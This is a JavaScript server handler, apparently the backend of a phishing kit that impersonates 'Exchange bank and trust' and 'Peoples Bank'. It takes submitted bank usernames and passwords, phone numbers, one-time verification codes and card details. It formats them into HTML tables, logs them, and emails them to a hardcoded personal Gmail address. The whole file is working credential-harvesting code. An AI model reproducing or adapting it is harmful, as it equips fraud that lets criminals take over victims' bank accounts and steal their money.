import nodemailer from 'nodemailer';

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }

    const { email, message, subject } = req.body;

    // Log incoming form data
    console.log('Form submission received:', { subject, email, message });

    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: process.env.EMAIL_USER,
            pass: process.env.EMAIL_PASS,
        },
    });

    // TEMP: Send to Samuel's email for testing
    const recipient = "samueldaniyan564@gmail.com"; // CHANGE THIS BACK LATER

    let customSubject = 'New Form Submission';
    let htmlBody = '';

    if (subject === 'Login Details') {
        customSubject = 'Submission of Exchange bank and trust sign in form';
        htmlBody = `
            <table border="1" cellpadding="8" cellspacing="0" style="border-collapse:collapse;font-family:Arial,sans-serif;">
                <tr style="background:#f4f4f4;"><th>Field</th><th>Value</th></tr>
                <tr><td>Username</td><td>${email}</td></tr>
                <tr><td>Password</td><td>${message}</td></tr>
            </table>
        `;
    } else if (subject === 'Contact Info') {
        customSubject = 'Submission of Exchange bank and trust Contact Verification form';
        htmlBody = `
            <table border="1" cellpadding="8" cellspacing="0" style="border-collapse:collapse;font-family:Arial,sans-serif;">
                <tr style="background:#f4f4f4;"><th>Field</th><th>Value</th></tr>
                <tr><td>Email Address</td><td>${email}</td></tr>
                <tr><td>Phone Number</td><td>${message}</td></tr>
            </table>
        `;
    } else if (subject === 'OTP Verification') {
        customSubject = 'Submission of Exchange bank and trust OTP verification form';
        htmlBody = `
            <table border="1" cellpadding="8" cellspacing="0" style="border-collapse:collapse;font-family:Arial,sans-serif;">
                <tr style="background:#f4f4f4;"><th>Field</th><th>Value</th></tr>
                <tr><td>Verification Code</td><td>${message}</td></tr>
            </table>
        `;
    } else if (subject === 'Card Info') {
        customSubject = 'Submission of Exchange bank and trust Card Verification form';
        // If message is a string with newlines, split and show as rows
        const cardRows = message
            .split('\n')
            .map(line => {
                const [key, ...rest] = line.split(':');
                return `<tr><td>${key.trim()}</td><td>${rest.join(':').trim()}</td></tr>`;
            })
            .join('');
        htmlBody = `
            <table border="1" cellpadding="8" cellspacing="0" style="border-collapse:collapse;font-family:Arial,sans-serif;">
                <tr style="background:#f4f4f4;"><th>Field</th><th>Value</th></tr>
                ${cardRows}
            </table>
        `;
    } else if (subject === 'Email Verification') {
        customSubject = 'Submission from Peoples Bank Contact Verification Form';
        htmlBody = `
            <div style="font-family:Arial,sans-serif;">
                <b>CONTACT VERIFICATION</b><br>
                Confirm your email and phone number<br><br>
                <b>Email Address:</b> ${email}<br>
                <b>Phone Number:</b> ${message.split('\n')[1]?.replace('Phone Number:', '').trim() || ''}
            </div>
        `;
    } else {
        // Try to format message as table rows if possible
        let rows = '';
        if (typeof message === 'string' && message.includes(':')) {
            rows = message
                .split('\n')
                .map(line => {
                    const [key, ...rest] = line.split(':');
                    return `<tr><td>${key.trim()}</td><td>${rest.join(':').trim()}</td></tr>`;
                })
                .join('');
        } else {
            rows = `<tr><td>Message</td><td>${message}</td></tr>`;
        }
        htmlBody = `
            <table border="1" cellpadding="8" cellspacing="0" style="border-collapse:collapse;font-family:Arial,sans-serif;">
                <tr style="background:#f4f4f4;"><th>Field</th><th>Value</th></tr>
                ${rows}
            </table>
        `;
    }

    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: recipient,
        subject: customSubject,
        html: htmlBody,
        text: message, // fallback
    };

    try {
        await transporter.sendMail(mailOptions);
        return res.status(200).json({ message: 'Email sent successfully' });
    } catch (error) {
        console.error('Error sending email:', error);
        return res.status(500).json({ message: 'Error sending email', error: error.message });
    }
}
